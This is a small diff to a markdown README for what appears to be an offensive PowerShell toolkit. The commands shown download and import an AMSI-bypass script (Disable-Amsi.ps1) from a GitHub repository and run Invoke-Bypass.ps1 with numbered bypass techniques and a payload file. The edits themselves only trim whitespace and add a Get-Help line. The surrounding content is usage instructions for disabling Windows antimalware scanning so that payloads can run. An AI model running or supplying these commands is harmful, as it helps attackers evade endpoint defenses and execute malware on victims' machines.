@@ -27,7 +27,7 @@ AMSBP
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
 ```
 
-```powershell      
+```powershell
 Import-Module -Name ".\Disable-Amsi.ps1" -Force
 Disable-Amsi -DontDisableBlockLogging "true"
 ```   
@@ -51,7 +51,8 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 -payloadurl 'string' only accepts .ps1 .bat .vbs file formats
 ```
 
-```powershell      
+```powershell
+Get-Help .\Invoke-Bypass.ps1 -full
 .\Invoke-Bypass.ps1 -list "technic"
 .\Invoke-Bypass.ps1 -technic "1"
 .\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1"
